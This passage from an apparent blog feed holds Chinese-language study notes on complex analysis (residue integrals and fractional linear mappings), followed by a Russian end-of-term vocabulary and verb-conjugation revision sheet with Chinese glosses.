0}^{+\infty}(-1)^k C_{n + k - 1}^{n - 1}(\frac{z - i}{2i})^k.<br>        \end{aligned}$$</p><p>其中 $\cfrac{1}{z - i}$ 的系数<br>$c_{-1} = \cfrac{(-1)^{n - 1}C_{2n - 2}^{n - 1}}{(2i)^{2n - 1}} = \cfrac{-iC_{2n - 2}^{n - 1}}{2^{2n - 1}}$.</p><p>那么 $$\begin{aligned}<br>            J_n &amp;= \pi i Res[f, i] \<br>            &amp;= \pi ic_{-1} \<br>            &amp;= \cfrac{\pi C_{2n - 2}^{n - 1}}{2^{2n - 1}}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分 $$J_{r, n} = \int_{0}^{+\infty}\cfrac{dx}{(r^2 + x^2)^n}.$$</p><p>其中 $r &gt; 0$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>$$\begin{aligned}<br>            J_{r, n} &amp;= \cfrac{1}{r^{2n - 1}}\int_{0}^{+\infty}\cfrac{d\left(\frac{x}{r}\right)}{\left(1 + \left(\frac{x}{r}\right)^{2}\right)^n} \<br>            &amp;= \cfrac{1}{r^{2n - 1}}J_n \<br>            &amp;= \cfrac{\pi C_{2n - 2}^{n - 1}}{(2r)^{2n - 1}}.<br>        \end{aligned}$$&nbsp;◻</p><h3 id="14-留数-C"><a href="#14-留数-C" class="headerlink" title="14. 留数 C"></a>14. 留数 C</h3><p>$\textbf{Example:}$<br>$C_R: Re^{i\theta}$, $0\le\theta\le\pi$, 多项式 $P$, $Q$ 满足<br>$\deg Q\ge\deg P + 1$, 则<br>$$\lim_{R\rightarrow +\infty}\limits\int_{C_R}\frac{P(z)e^{ikz}}{Q(z)}dz = 0.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分 $$I = \int_{0}^{+\infty}\cfrac{x\sin kx}{x^2 + a^2}dx,$$</p><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数.&nbsp;◻</p><p>$\textbf{Solution:}$<br>记 $f(z) = \cfrac{z\sin kz}{z^2 + a^2}$,<br>$h(z) = \cfrac{ze^{ikx}}{z^2 + a^2}$.</p><p>那么<br>$$\int_{-\infty}^{+\infty}\limits h(z)dz = \int_{-\infty}^{+\infty}\limits\cfrac{z\cos kz}{z^2 + a^2}dz + i\int_{-\infty}^{+\infty}\limits f(z)dz = 2iI.$$</p><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$, 那么根据复合闭路定理, 得<br>$$\oint_{\Gamma_R}h(z)dz = \int_{-R}^{R}h(x)dx + \int_{C_R}h(z)dz.$$</p><p>令 $R\rightarrow +\infty$, 由于<br>$$\lim_{R\rightarrow +\infty}\int_{C_R}h(z)dz = 0,$$</p><p>那么 $$\begin{aligned}<br>            \int_{-\infty}^{+\infty}\cfrac{ze^{ikz}}{z^2 + a^2}dz &amp;= \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}h(z)dz \<br>            &amp;= 2\pi i Res\left[f(z), ai\right] \<br>            &amp;= 2\pi i\cdot\cfrac{e^{-ka}}{2} \<br>            &amp;= \cfrac{\pi i}{e^{ka}}.<br>        \end{aligned}$$</p><p>两边取虚部, 得 $$\begin{aligned}<br>            I = \cfrac{\pi}{2e^{ka}}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分<br>$$I_n = \int_{0}^{+\infty}\cfrac{x\sin kx}{(x^2 + a^2)^n}dx,$$</p><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$\frac{\partial I_n}{\partial a} = -2na\int_{0}^{+\infty}\cfrac{x\sin kx}{(x^2 + a^2)^{n + 1}}dx = -2naI_{n + 1}.$$</p><p>即 $$I_{n + 1} = -\cfrac{1}{2na}\frac{\partial I_n}{\partial a}.$$</p><p>依次递归求解即可.&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分<br>$$I_{a, b, k} = \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx,$$</p><p>其中 $a&gt;0$, $b &gt; 0$, $k &gt; 0$ 为常数.&nbsp;◻</p><p>$\textbf{Solution:}$<br>记 $f(z) = \cfrac{z^3\sin kz}{(z^2 + a^2)(z^2 + b^2)}$,<br>$h(z) = \cfrac{z^3e^{ikx}}{(z^2 + a^2)(z^2 + b^2)}$.</p><p>那么<br>$$\int_{-\infty}^{+\infty}\limits h(z)dz = \int_{-\infty}^{+\infty}\limits\cfrac{z^3\cos kz}{(z^2 + a^2)(z^2 + b^2)}dz + i\int_{-\infty}^{+\infty}\limits f(z)dz = 2iI_{a, b, k}.$$</p><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$, 那么根据复合闭路定理, 得<br>$$\oint_{\Gamma_R}h(z)dz = \int_{-R}^{R}h(x)dx + \int_{C_R}h(z)dz.$$</p><p>令 $R\rightarrow +\infty$, 由于<br>$$\lim_{R\rightarrow +\infty}\int_{C_R}h(z)dz = 0,$$</p><p>那么 $$\begin{aligned}<br>            \int_{-\infty}^{+\infty}\cfrac{z^3e^{ikz}}{(z^2 + a^2)(z^2 + b^2)}dz &amp;= \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}h(z)dz \<br>            &amp;= 2\pi i\left(Res\left[f(z), ai\right] + Res\left[f(z), bi\right]\right) \<br>            &amp;= \pi i\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.<br>        \end{aligned}$$</p><p>两边取虚部, 得 $$\begin{aligned}<br>            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx = \cfrac{\pi}{2}\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分<br>$$I_{a, k} = \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx,$$</p><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数.&nbsp;◻</p><p>$\textbf{Solution:}$<br>在 $$\begin{aligned}<br>            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx = \cfrac{\pi}{2}\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.<br>        \end{aligned}$$</p><p>中, 令 $b\rightarrow a$, 得 $$\begin{aligned}<br>            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx = \cfrac{\pi}{2}\cdot\cfrac{(2 - ka)e^{-ka}}{2}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求复积分 $$I_k = \int_{0}^{+\infty}\cfrac{\sin kx}{x}dx.$$</p><p>其中 $k &gt; 0$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>在 $$\begin{aligned}<br>            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx = \cfrac{\pi}{2}\cdot\cfrac{(2 - ka)e^{-ka}}{2}.<br>        \end{aligned}$$</p><p>中, 令 $a\rightarrow 0^{+}$, 得 $$\begin{aligned}<br>            \int_{0}^{+\infty}\cfrac{\sin kx}{x}dx = \cfrac{\pi}{2}.<br>        \end{aligned}$$&nbsp;◻</p><h3 id="15-解析映射"><a href="#15-解析映射" class="headerlink" title="15. 解析映射"></a>15. 解析映射</h3><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 将 $z_k = -1, 0, 1$ 映射到 $w_k = -1, 1, i$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>利用不变式<br>$$\cfrac{w - w_1}{w - w_2}\bigg/\cfrac{w_3 - w_1}{w_3 - w_2} = \cfrac{z - z_1}{z - z_2}\bigg/\cfrac{z_3 - z_1}{z_3 - z_2}.$$</p><p>那么<br>$$\cfrac{w + 1}{w - 1}\bigg/\cfrac{i + 1}{i - 1} = \cfrac{z + 1}{z}\bigg/\cfrac{2}{1}.$$</p><p>从中解得 $$w = \cfrac{(1 + 2i)z + 1}{(1 - 2i)z + 1}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 将单位圆周映射到直线.&nbsp;◻</p><p>$\textbf{Solution:}$<br>一方面, 容易知道存在 $\left|{z_0}\right| = 1$, 使得<br>$cz_0 + d = 0$.</p><p>注意到 $$\begin{aligned}<br>            &amp;\hspace{1.8em} cz_0 + d = 0 \<br>            &amp;\Rightarrow \left|{cz_0}\right| = \left|{d}\right| \<br>            &amp;\Leftrightarrow \left|{c}\right| = \left|{d}\right| \<br>            &amp;\Leftrightarrow c = de^{i\theta}.<br>        \end{aligned}$$</p><p>另一方面, 当 $c = de^{i\theta}$ 时, 该分式线性映射满足条件.&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将单位圆盘 $\left|{z}\right| &lt; 1$ 映射到单位圆盘<br>$\left|{w}\right| &lt; 1$;</li><li>将点 $z = z_1\thinspace(\left|{z_1}\right| &lt; 1)$ 映射到点 $w = 0$.&nbsp;◻</li></ul><p>$\textbf{Solution:}$<br>由于分式线性映射保对称点的性质,</p><p>映射前 $z_1$ 的对称点为 $\cfrac{1}{\overline{z_1}}$, 映射后为 $0$<br>的对称点 $+\infty$. 故<br>$$w = \alpha\cfrac{z - z_1}{z - \frac{1}{\overline{z_1}}} = (-\alpha z_1)\cfrac{z - z_1}{1 - z\overline{z_1}} = \beta\cfrac{z - z_1}{1 - z\overline{z_1}}.$$</p><p>由最大模原理:<br>$$\left|{z}\right| = 1\Leftrightarrow\left|{w}\right| = 1.$$</p><p>注意到 $\left|{z_1}\right| &lt; 1$, 从而有 $$\begin{aligned}<br>            1 &amp;= \left|{\beta}\right|\left|{\cfrac{z - z_1}{1 - z\overline{z_1}}}\right|<em>{\left|{z}\right| = 1} \<br>            &amp;= \left|{\beta}\right|\left|{\cfrac{z - z_1}{z\overline{z} - z\overline{z_1}}}\right|</em>{\left|{z}\right| = 1} \<br>            &amp;= \cfrac{\left|{\beta}\right|}{\left|{z}\right|}\left|{\cfrac{z - z_1}{\overline{z  - z_1}}}\right|_{\left|{z}\right| = 1} \<br>            &amp;= \left|{\beta}\right|.<br>        \end{aligned}$$</p><p>即 $$\beta = e^{i\theta}, \theta\in[0, 2\pi).$$</p><p>那么有<br>$$w = e^{i\theta}\cfrac{z - z_1}{1 - z\overline{z_1}}, \thinspace\left|{z_1}\right| &lt; 1, \thinspace\theta\in[0, 2\pi).$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将单位圆盘 $\left|{z - z_0}\right| &lt; r$ 映射到单位圆盘<br>$\left|{w - w_0}\right| &lt; R$;</li><li>将点 $z = z_1\thinspace(\left|{z_1 - z_0}\right| &lt; r)$ 映射到点<br>$w = w_0$.&nbsp;◻</li></ul><p>$\textbf{Solution:}$<br>考虑 $$z’ = \cfrac{z - z_0}{r}, w’ = \cfrac{w - w_0}{R}.$$</p><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为单位圆盘. 那么有<br>$$w’ = e^{i\theta}\cfrac{z’ - z_1’}{1 - z’\overline{z_1’}}, \thinspace\left|{z_1’}\right| &lt; 1, \thinspace\theta\in[0, 2\pi).$$</p><p>代入 $w’$, $z’$ 可得<br>$$w = w_0 + rRe^{i\theta}\cfrac{z - z_1}{r^2 - (z - z_0)(\overline{z_1} - \overline{z_0})}, \thinspace\left|{z_1 - z_0}\right| &lt; r, \thinspace\theta\in[0, 2\pi).$$&nbsp;◻</p><p>$\textbf{Example:}$<br>对于 中的映射, 证明不变式:<br>$$\cfrac{\left|{dw}\right|}{1 - \left|{w}\right|^2} = \cfrac{\left|{dz}\right|}{1 - \left|{z}\right|^2}.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>即证:<br>$$\left|{\cfrac{dw}{dz}}\right| = \cfrac{1 - \left|{w}\right|^2}{1 - \left|{z}\right|^2}.$$</p><p>注意到 $$w = e^{i\theta}\cfrac{z - z_1}{1 - z\overline{z_1}},$$</p><p>其中 $$\left|{z_1}\right| &lt; 1, \thinspace\theta\in[0, 2\pi)$$</p><p>那么 $$\begin{aligned}<br>            LHS = \left|{e^{i\theta}\cfrac{1 - z_1\overline{z_1}}{(1 - z\overline{z_1})^2}}\right| = \cfrac{1 - z_1\overline{z_1}}{\left|{1 - z\overline{z_1}}\right|^2}.<br>        \end{aligned}$$</p><p>$$\begin{aligned}<br>            RHS &amp;= \cfrac{1 - w\overline{w}}{1 - z\overline{z}} \<br>            &amp;= \cfrac{\left|{1 - z\overline{z_1}}\right|^2 - \left|{z - z_1}\right|^2}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \<br>            &amp;= \cfrac{(1 - z\overline{z_1})(1 - z_1\overline{z}) - (z - z_1)(\overline{z} - \overline{z_1})}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \<br>            &amp;= \cfrac{1 - z\overline{z} - z_1\overline{z_1} + z\overline{z}z_1\overline{z_1}}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \<br>            &amp;= \cfrac{(1 - z\overline{z})(1 - z_1\overline{z_1})}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \<br>            &amp;= \cfrac{1 - z_1\overline{z_1}}{\left|{1 - z\overline{z_1}}\right|^2} = LHS.<br>        \end{aligned}$$</p><p>至此证毕.&nbsp;&nbsp;◻</p><p>$\textbf{Example:}$<br>对于 中的映射, 证明不变式:<br>$$\cfrac{R\left|{dw}\right|}{R^2 - \left|{w - w_0}\right|^2} = \cfrac{r\left|{dz}\right|}{r^2 - \left|{z - z^0}\right|^2}.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>考虑 $$z’ = \cfrac{z - z_0}{r}, w’ = \cfrac{w - w_0}{R}.$$</p><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为单位圆盘. 那么有<br>$$\cfrac{\left|{dw’}\right|}{1 - \left|{w’}\right|^2} = \cfrac{\left|{dz’}\right|}{1 - \left|{z’}\right|^2}.$$</p><p>代入 $w’$, $z’$ 可得<br>$$\cfrac{R\left|{dw}\right|}{R^2 - \left|{w - w_0}\right|^2} = \cfrac{r\left|{dz}\right|}{r^2 - \left|{z - z^0}\right|^2}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将上半复平面 $Im{z} &gt; 0$ 映射到单位圆盘 $\left|{w}\right| &lt; 1$;</li><li>将点 $z = z_1\thinspace(Im{z_1} &gt; 0)$ 映射到点 $w = 0$.&nbsp;◻</li></ul><p>&nbsp;$\textbf{Solution:}$<br>将上半平面看作半径无穷的圆, $z_1$ 关于圆周的对称点为<br>$\overline{z_1}$.</p><p>由于分式线性映射保对称点的性质,</p><p>映射前 $z_1$ 的对称点为 $\overline{z_1}$, 映射后为 $0$ 的对称点<br>$+\infty$. 故 $$w = \alpha\cfrac{z - z_1}{z - \overline{z_1}}.$$</p><p>由最大模原理: $$z = x\in\mathbb{R}\Leftrightarrow\left|{w}\right| = 1.$$</p><p>注意到 $Im{z_1} &gt; 0$, 从而有 $$\begin{aligned}<br>            1 &amp;= \left|{\alpha}\right|\left|{\cfrac{x - z_1}{x - \overline{z_1}}}\right| \<br>            &amp;= \left|{\alpha}\right|\left|{\cfrac{x - z_1}{\overline{x} - \overline{z_1}}}\right| \<br>            &amp;= \left|{\alpha}\right|.<br>        \end{aligned}$$</p><p>即 $$\alpha = e^{i\theta}, \theta\in[0, 2\pi).$$</p><p>那么有<br>$$w = e^{i\theta}\cfrac{z - z_1}{z - \overline{z_1}}, \thinspace Im{z_1} &gt; 0, \thinspace\theta\in[0, 2\pi).$$</p><p>特别地, 取 $\theta = 0, z_1 = i$, 可得 $$w = \cfrac{z - i}{z + i}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将过点 $x_0\in\mathbb{R}$, 旋转角为 $\theta_0$<br>的半平面映射到单位圆盘 $\left|{w - w_0}\right| &lt; R$;</li><li>将点 $z = z_1\thinspace(Im{[(z_1 - x_0)e^{-i\theta_0}]} &gt; 0)$<br>映射到点 $w = w_0$.&nbsp;◻</li></ul><p>$\textbf{Solution:}$<br>考虑<br>$$z’ = (z - x_0)e^{-i\theta_0}, w’ = \cfrac{w - w_0}{R}.$$</p><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为上半复平面与单位圆盘. 那么有<br>$$w’ = e^{i\theta}\cfrac{z’ - z_1’}{z’ - \overline{z_1’}}, \thinspace Im{z_1’} &gt; 0, \thinspace\theta\in[0, 2\pi).$$</p><p>代入 $w’$, $z’$ 可得<br>$$w = w_0 + Re^{i\theta}\cfrac{z - z_1}{z - x_0 - (\overline{z_1} - x_0)e^{2i\theta_0}},$$</p><p>其中<br>$$Im{[(z_1 - x_0)e^{-i\theta_0}]} &gt; 0, \thinspace\theta\in[0, 2\pi).$$&nbsp;◻</p><p>$\textbf{Example:}$<br>映射 $w = \cfrac{az + b}{cz + d}$, 若 $a, b, c, d\in\mathbb{R}$, 则<br>$$Im{z} &gt; 0\leftrightarrow Im{w} &gt; 0 \Longleftrightarrow ad - bc &gt; 0.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>将 $z = x + iy$ 待入 $$w = \cfrac{az + b}{cz + d},$$</p><p>得 $$w = u + iv = \cfrac{(ax + b) + iay}{(cx + d) + icy},$$</p><p>那么 $$v = \cfrac{(ad - bc)y}{(cx + d)^2 + (cy)^2}.$$</p><p>从而 $$\begin{aligned}<br>            &amp;\hspace{2em} Im{z} &gt; 0\leftrightarrow Im{w} &gt; 0 \<br>            &amp;\Longleftrightarrow y &gt; 0\leftrightarrow v &gt; 0 \<br>            &amp;\Longleftrightarrow yv &gt; 0 \<br>            &amp;\Longleftrightarrow \cfrac{(ad - bc)y^2}{(cx + d)^2 + (cy)^2} &gt; 0 \<br>            &amp;\Longleftrightarrow ad - bc &gt; 0.<br>        \end{aligned}$$</p><p>根据最大模原理可知,</p><p>该映射将上半复平面映到上半复平面, 实轴映到实轴.</p><p>又当 $z\in\mathbb{R}$ 时,<br>$$\cfrac{dw}{dz} = \cfrac{ad - bc}{(cz + d)^2} &gt; 0.$$</p><p>即 $$\arg\left(\frac{dw}{dz}\right) = 0.$$</p><p>故该映射将上半复平面映到上半复平面, 实轴正向映到实轴正向.&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将过点 $a, b\in\mathbb{R}$, 旋转角为 $\alpha\in(0, \pi)$<br>的长条映射到单位圆盘 $\left|{w}\right| &lt; 1$.&nbsp;◻</li></ul><p>$\textbf{Solution:}$<br>分为四步</p><ol><li>$z_1 = e^{-i\alpha}(z - b)$</li><li>$z_2 = \cfrac{\pi}{h}z_1$</li><li>$z_3 = e^{z_2}$</li><li>$w = \cfrac{z_3 - i}{z_3 + i}$</li></ol><p>整理得<br>$$w = \cfrac{e^{\frac{e^{-i\alpha}(z - b)\pi}{(b - a)\sin\alpha}} - i}{e^{\frac{e^{-i\alpha}(z - b)\pi}{(b - a)\sin\alpha}} + i}.$$</p><p>特别地, 当 $\alpha = \cfrac{\pi}{2}$ 时,<br>$$w = \cfrac{e^{\frac{b - z}{b - a}\pi i} - i}{e^{\frac{b - z}{b - a}\pi i} + i}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:/</p><ul><li>将区域<br>$0 &lt; r &lt; R, \thinspace 0 &lt; \theta &lt; \alpha \thinspace(\alpha\in[0, 2\pi))$<br>映射到单位圆盘 $\left|{w}\right| &lt; 1$.&nbsp;◻</li></ul><p>&nbsp;$\textbf{Solution:}$<br>分为四步</p><ol><li>$z_1 = z^{\frac{\pi}{\alpha}}$</li><li>$z_2 = \cfrac{R^{\frac{\pi}{\alpha}} + z_1}{R^{\frac{\pi}{\alpha}} - z_1}$<br>(上半圆 $\longrightarrow$ 第一象限)</li><li>$z_3 = z_2^2$</li><li>$w = \cfrac{z_3 - i}{z_3 + i}$</li></ol><p>整理得<br>$$w = \cfrac{\left(\frac{R^{\frac{\pi}{\alpha}} + z^{\frac{\pi}{\alpha}}}{R^{\frac{\pi}{\alpha}} - z^{\frac{\pi}{\alpha}}}\right)^2 - i}{\left(\frac{R^{\frac{\pi}{\alpha}} + z^{\frac{\pi}{\alpha}}}{R^{\frac{\pi}{\alpha}} - z^{\frac{\pi}{\alpha}}}\right)^2 + i}.$$</p><p>特别地, 当 $\alpha = \cfrac{\pi}{8}$ 时,<br>$$w = \cfrac{\left(\frac{R^8 + z^8}{R^8 - z^8}\right)^2 - i}{\left(\frac{R^8 + z^8}{R^8 - z^8}\right)^2 + i}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将<br>$\left|{z - a}\right| &gt; a, \left|{z - b}\right| &lt; b\thinspace(0 &lt; a &lt; b)$<br>所围区域映到单位圆盘 $\left|{w}\right| &lt; 1$.&nbsp;◻</li></ul><p>$\textbf{Solution:}$<br>分为五步</p><ol><li>$z_1 = \cfrac{z - 2a}{z}$ ($0 &lt; x &lt; \cfrac{b - a}{a}$ 的竖直长条)</li><li>$z_2 = iz_1$</li><li>$z_3 = \cfrac{\pi}{\frac{b - a}{a}}z_2$</li><li>$z_4 = e^{z_3}$</li><li>$w = \cfrac{z_4 - i}{z_4 + i}$</li></ol><p>整理得<br>$$w = \cfrac{e^{\frac{ib(z - 2a)\pi}{(b - a)z}} - i}{e^{\frac{ib(z - 2a)\pi}{(b - a)z}} + i}.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将以 $A, B$ 为端点, $\theta_0\in(0, 2\pi)$<br>为弦切角的弓形映到单位圆盘 $\left|{w}\right| &lt; 1$.&nbsp;◻</li></ul><p>&nbsp;$\textbf{Solution:}$<br>分为三步</p><ol><li>$z_1 = \cfrac{z - A}{B - z}$ (弓形 $\longrightarrow$ 第一象限角域)</li><li>$z_2 = z_1^{\frac{\pi}{\theta_0}}$</li><li>$w = \cfrac{z_2 - i}{z_2 + i}$</li></ol><p>整理得<br>$$w = \cfrac{\left(\frac{z - A}{B - z}\right)^{\frac{\pi}{\theta_0}} - i}{\left(\frac{z - A}{B - z}\right)^{\frac{\pi}{\theta_0}} + i}.$$&nbsp;◻</p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Russian End-of-term Revision</title>
      <link href="/44/"/>
      <url>/44/</url>
      
        <content type="html"><![CDATA[<h4 id="及物动词"><a href="#及物动词" class="headerlink" title="及物动词"></a>及物动词</h4><ul><li>(第四课) есть; </li><li>(第五课) делать, читать, считать, искать, знать, слушать; </li><li>(第六课) смотреть, писать, учить;</li><li>(第七课) любить, изучать;</li><li>(第九课) рассказывать, видеть, ждать, петь, вспоминать;</li><li>(第十课) звать;</li><li>(常用) покупать.</li></ul><ol><li><p>делать (做):</p><p>делать урок; делать упражнения (练习);</p></li><li><p>читать (读):</p><p>читать книгу (书); читать текст; читать диалог; читать стихи (诗歌); </p></li><li><p>считать (数):</p><p>считать бананы; </p></li><li><p>искать (寻找):</p><p>искать часы (时间); искать плащ; искать счастье (幸福); </p></li><li><p>знать (了解, 认识):</p><p>знать это; знать тебя; знать русский язык; </p></li><li><p>слушать (听):</p><p>слушать музыку; слушать текст; слушать диалог; слушать стихи;</p></li><li><p>смотреть (看):</p><p>смотреть телевизор (电视); смотреть фильм; </p></li><li><p>писать (写):</p><p>писать письмо; писать новые слова; писать диалог; писать стихи;</p></li><li><p>любить (热爱):</p><p>любить весну и зиму; любить русский язык; Я тебя люблю (我爱你);</p></li><li><p>изучать (研究): </p><p>изучать русский язык; изучать математику; изучать стихи; изучать Пушкина;</p></li><li><p>видеть (看见):</p><p>Вчера мы видели тебя в библиотеке.</p></li><li><p>ждать (等待):</p><p>Мы тебя ждали вчера в аудитории.</p></li><li><p>петь (唱歌):</p><p>Мы поём русскую песню «Подмосковные вечера».</p></li><li><p>звать (招呼; 叫做)</p><p>Как тебя зовут?</p></li></ol><h4 id="非及物动词"><a href="#非及物动词" class="headerlink" title="非及物动词"></a>非及物动词</h4><ul><li>(第五课) работать, отдыхать, ужинать, играть, жить; </li><li>(第六课) говорить, хотеть, обедать, учиться;</li><li>(第七课) идти, ехать, разговаривать, мечтать, отвечать, заниматься;</li><li>(第八课) вставать, завтракать;</li><li>(第九课) лежать, быть, гулять, фотографироваться, собраться;</li><li>(第十课) сидеть, родиться;</li><li>(常用) стоять, лететь.</li></ul><ol><li><p>работать (工作):</p><p>работать на заводе; работать в Пекине; работать в Москве; работать на юге;</p></li><li><p>отдыхать (休息):</p><p>отдыхать дома; отдыхать на юге;</p></li><li><p>завтракать, обедать, ужинать (吃早 / 午 / 晚饭):</p><p>завтракать дома; обедать в кафе; ужинать  в институте; ужинать  в буфете (小吃部);</p></li><li><p>жить (居住):</p><p>жить дома; жить в институте; жить в Санкт-Петербурге;</p></li><li><p>играть (玩):</p><p>играть в футбол; играть в шахматы;</p></li><li><p>говорить (说):</p><p>говорить по-русски; говорить по-китайски;</p></li><li><p>хотеть (想):</p><p>хотеть читать стихи; хотеть смотреть телевизор; хотеть слушать музыку.</p></li><li><p>идти (步行): </p><p>Я иду на урок.</p></li><li><p>ехать (乘车):</p><p>Я еду на работу.</p></li><li><p>разговаривать (交谈):</p><p>Они разговаривают об учебе и о работе. Вы разговариваете о Москве?</p></li><li><p>мечтать (渴望):</p><p>мечтать учиться в России;  мечтать работать на юге;</p></li><li><p>отвечать (回答):</p><p>отвечать на вопросы;</p></li><li><p>стоять (站立):</p><p>На столе стоит красивая ваза.</p></li><li><p>лежать (放置):</p><p>На столе лежат книги и словари.</p></li><li><p>быть (曾经在):</p><p>Вчера вечером Антон и Нина были в театре.</p></li><li><p>гулять (散步):</p><p>Виктор и Анна гуляют в саду.</p></li><li><p>фотографироваться (摄像):</p><p>Они фотографируются в парке.</p></li><li><p>собраться (聚集):</p><p>Вчера мои товарищи собрались вместе. </p></li><li><p>сидеть (坐着):</p><p>Мы сидим в своей красивой аудитории. </p></li><li><p>родиться (出生):</p><p>Он родился в Пекине.</p></li></ol><h4 id="第一变位法"><a href="#第一变位法" class="headerlink" title="第一变位法"></a>第一变位法</h4><p><strong>正常变位</strong></p><ul><li>разговаривать, мечтать, отвечать, изучать, заниматься, покупать (购买), гулять.</li></ul><p><strong>特殊变位</strong></p><ul><li>писать: я пишу, ты пишешь, они пишут;</li><li>жить: я живу, ты живёшь, они живут;</li><li>звать: я зову, ты зовёшь, они зовут;</li><li>искать: я ищу, ты ищешь, они ищут;</li><li>идти: я иду, ты идёшь, они идут; </li><li>ехать: я еду, ты едешь, они едут;</li><li>вставать: я встаю, ты встаёшь, они встают.</li><li>танцевать: я танцую, ты танцуешь, они танцуют.</li></ul><h4 id="第二变位法"><a href="#第二变位法" class="headerlink" title="第二变位法"></a>第二变位法</h4><p><strong>正常变位</strong></p><ul><li>говорить: я говорю, ты говоришь, они говорят;</li><li>стоять: я стою, ты стоишь, они стоят; </li><li>учить: я учу, ты учишь, они учат;</li><li>учиться: я учусь, ты учишься, они учатся;</li><li>смотреть: я смотрю, ты смотришь, они смотрят;</li></ul><p><strong>特殊变位</strong></p><ul><li>любить: я люблю, ты любишь, они любят.</li><li>лететь (飞行): я лечу, ты летишь, они летят.</li><li>сидеть: я сижу, ты сидишь, они сидят.</li></ul><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><ul><li>говорить по-русски 俄语</li><li>говорить по-китайски 汉语</li><li>говорить по-английски 英语</li></ul><h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><ul><li>один час;</li><li>два / три / четыре часа;</li><li>пять / шесть / семь / восемь / девять / десять / одиннадцать / двенадцать часов.</li></ul><h4 id="星期"><a href="#星期" class="headerlink" title="星期"></a>星期</h4><ul><li>понедельник, вторник, среда, четверг, пятница, суббота, воскресенье.</li></ul><h4 id="月份"><a href="#月份" class="headerlink" title="月份"></a>月份</h4><ul><li>январь, февраль, март, апрель;</li><li>май, июнь, июль, август;</li><li>сентябрь, октябрь, ноябрь, декабрь.</li></ul><h4 id="第一至六课词组"><a href="#第一至六课词组" class="headerlink" title="第一至六课词组"></a>第一至六课词组</h4><ul><li>我 / 你 / 您 / 他 / 她叫… меня / тебя / вас / его / её зовут…</li><li>在喷泉旁 у фонтана</li><li>您的儿子 ваш сын</li><li>我的朋友 мой друг; моя подруга</li><li>你们的新房子 ваш новый дом</li><li>我的旧作业本 моя старая тетрадь</li><li>他的新车 его новая машина</li><li>我们的旧桌子 наш старый стол</li><li>你们的旧花园 ваш старый сад</li><li>他们的新护照 их новые паспорта</li><li>在工厂工作 работать на заводе</li><li>在学院里工作 работать в институте</li><li>在剧院里工作 работать в театре</li><li>懂俄语 знать русский язык</li><li>了解你 знать тебя</li><li>听音乐 слушать музыку</li><li>在南方休息  отдыхать на юге</li><li>在疗养院休息 отдыхать в санатории</li><li>在家休息 отдыхать дома</li><li>在家吃早餐 завтракать дома</li><li>在咖啡厅吃午餐 обедать в кафе</li><li>在小吃部吃晚餐 ужинать в буфете</li><li>在教室里做功课 делать урок в аудитории</li><li>在宿舍里做练习 делать упражнение в общежитии</li><li>踢足球 играть в футбол</li><li>下象棋 играть в шахматы</li><li>数香蕉 считать бананы</li><li>写生词 писать новые слова</li><li>住在莫斯科 жить в 